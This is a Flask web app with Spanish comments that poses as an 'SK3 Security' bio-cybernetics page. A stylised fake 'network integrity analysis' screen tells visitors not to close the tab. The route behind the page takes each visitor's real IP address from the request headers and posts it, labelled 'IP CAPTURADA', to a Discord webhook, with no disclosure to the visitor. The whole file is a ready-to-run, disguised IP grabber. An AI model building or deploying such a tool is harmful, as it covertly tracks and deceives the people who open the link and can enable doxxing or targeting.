from flask import Flask, request, render_template_string
import requests
import os
import datetime

app = Flask(__name__)

# CONFIGURACIÓN: Aquí pondrás el Webhook que copies de tu canal `🛡️-sk3-intel`
WEBHOOK_URL = os.getenv("SK3_WEBHOOK")

# --- DISEÑO HTML/CSS DE SK3 TITANIUM CORE (BIO-EDITION) ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SK3 Security - Bio-Cybernetics Division</title>
    <style>
        /* --- ESTILOS NÚCLEO --- */
        :root {
            --bg-dark: #0a0e14;
            --panel-dark: #121820;
            --cyber-green: #00ff88;
            --cyber-blue: #00d2ff;
            --text-main: #e0e6ed;
            --glitch-filter: drop-shadow(0 0 5px var(--cyber-green));
        }

        body {
            background-color: var(--bg-dark);
            color: var(--text-main);
            font-family: 'SF Mono', 'Courier New', Courier, monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
            position: relative;
        }

        /* --- DECORACIONES: HOJAS DIGITALES (CSS) --- */
        .leaf {
            position: absolute;
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, rgba(0,255,136,0.1), rgba(0,210,255,0.05));
            border-radius: 2px 50% 2px 50%;
            border: 1px solid rgba(0,255,136,0.2);
            filter: blur(1px);
            opacity: 0.6;
            animation: drift 15s infinite ease-in-out;
        }

        /* Posiciones de las hojas */
        .leaf-1 { top: 10%; left: 5%; transform: rotate(15deg); }
        .leaf-2 { top: 70%; left: 80%; transform: rotate(-30deg); animation-delay: 2s; }
        .leaf-3 { top: 80%; left: 15%; transform: rotate(120deg); animation-delay: 4s; }
        .leaf-4 { top: 15%; left: 85%; transform: rotate(-90deg); animation-delay: 6s; }

        @keyframes drift {
            0% { transform: translate(0,0) rotate(var(--rot)); opacity: 0.6; }
            50% { transform: translate(10px, 15px) rotate(calc(var(--rot) + 5deg)); opacity: 0.8; }
            100% { transform: translate(0,0) rotate(var(--rot)); opacity: 0.6; }
        }

        /* --- PANEL CENTRAL --- */
        .main-panel {
            background-color: var(--panel-dark);
            border: 1px solid rgba(0,255,136,0.2);
            border-radius: 8px;
            padding: 40px;
            width: 90%;
            max-width: 500px;
            text-align: center;
            box-shadow: 0 0 20px rgba(0,0,0,0.5);
            position: relative;
            z-index: 10;
        }

        .main-panel::before {
            content: '';
            position: absolute;
            top: 0; left: 0; width: 100%; height: 3px;
            background: linear-gradient(90deg, var(--cyber-green), var(--cyber-blue));
            border-radius: 8px 8px 0 0;
        }

        /* --- HEADER Y LOGO --- */
        .header {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 15px;
            margin-bottom: 30px;
        }

        .logo {
            width: 50px;
            height: 50px;
            border: 2px solid var(--cyber-green);
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            font-weight: bold;
            font-size: 20px;
            color: var(--cyber-green);
            filter: var(--glitch-filter);
        }

        .sk3-title {
            margin: 0;
            font-size: 24px;
            font-weight: bold;
            color: var(--text-main);
            text-transform: uppercase;
        }

        /* --- BARRA DE CARGA / ANÁLISIS --- */
        .analysis-box {
            border: 1px dashed rgba(224, 230, 237, 0.2);
            border-radius: 4px;
            padding: 20px;
            margin-bottom: 30px;
        }

        .status-text {
            color: var(--cyber-green);
            margin-bottom: 15px;
            font-size: 14px;
        }

        .loader-container {
            width: 100%;
            height: 8px;
            background-color: rgba(224, 230, 237, 0.1);
            border-radius: 4px;
            overflow: hidden;
            position: relative;
        }

        .loader-bar {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, var(--cyber-green), var(--cyber-blue));
            border-radius: 4px;
            animation: load 4s forwards ease-in-out;
        }

        @keyframes load {
            0% { width: 0%; }
            10% { width: 15%; }
            30% { width: 40%; }
            60% { width: 75%; }
            90% { width: 95%; }
            100% { width: 100%; }
        }

        /* --- INFOS ADICIONALES --- */
        .info-footer {
            font-size: 12px;
            color: rgba(224, 230, 237, 0.5);
            display: flex;
            justify-content: space-between;
        }

    </style>
</head>
<body>

    <div class="leaf leaf-1" style="--rot: 15deg;"></div>
    <div class="leaf leaf-2" style="--rot: -30deg;"></div>
    <div class="leaf leaf-3" style="--rot: 120deg;"></div>
    <div class="leaf leaf-4" style="--rot: -90deg;"></div>

    <main class="main-panel">
        <header class="header">
            <div class="logo">SK3</div>
            <h1 class="sk3-title">Bio-Cybernetics Intel</h1>
        </header>

        <section class="analysis-box">
            <p class="status-text">► ANALIZANDO INTEGRIDAD DE RED... [OK]</p>
            <div class="loader-container">
                <div class="loader-bar"></div>
            </div>
            <p style="font-size: 10px; color: rgba(224, 230, 237, 0.4); margin-top: 5px;">
                Analizando huella digital. No cierre la pestaña.
            </p>
        </section>

        <footer class="info-footer">
            <span>Core: Titanium v22</span>
            <span>Est: [[ timestamp ]] [[ region ]]</span>
        </footer>
    </main>

</body>
</html>
"""

# --- PARTE LÓGICA (No cambia, solo captura) ---
@app.route('/')
def index():
    # Capturamos la IP real
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ',' in str(ip):
        ip = ip.split(',')[0]

    # Datos para mandar a Discord (lo de antes)
    payload = {
        "embeds": [{
            "title": "🛰️ IP CAPTURADA - SK3 TITANIUM CORE (Bio-Div)",
            "description": f"**IP:** `{ip}`\n**Usuario:** Analizando...",
            "color": 0x00ff88,
            "footer": {"text": "Titanium Core | Sistema de Inteligencia"}
        }]
    }

    # Mandamos al Webhook
    if WEBHOOK_URL:
        requests.post(WEBHOOK_URL, json=payload)

    # Renderizamos el diseño bonito
    # Pasamos datos como el tiempo actual y la región (puedes ajustarla)
    now = datetime.datetime.now().strftime("%H:%M")
    return render_template_string(HTML_TEMPLATE, timestamp=now, region="DOM-REP")

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=10000)
